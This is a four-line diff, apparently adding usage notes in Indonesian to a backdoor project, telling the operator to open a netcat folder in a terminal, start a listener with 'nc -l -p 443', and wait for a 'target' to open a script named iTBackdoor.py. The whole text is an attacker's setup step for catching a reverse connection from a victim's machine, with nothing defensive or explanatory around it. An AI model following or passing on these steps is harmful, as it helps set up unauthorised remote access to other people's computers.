@@ -1,0 +1,4 @@
+1. buka folder netcat lwat terminal
+2. ketik nc -l -p 443
+3. tunggu sampai target membuka aplikasi iTBackdoor.py
+
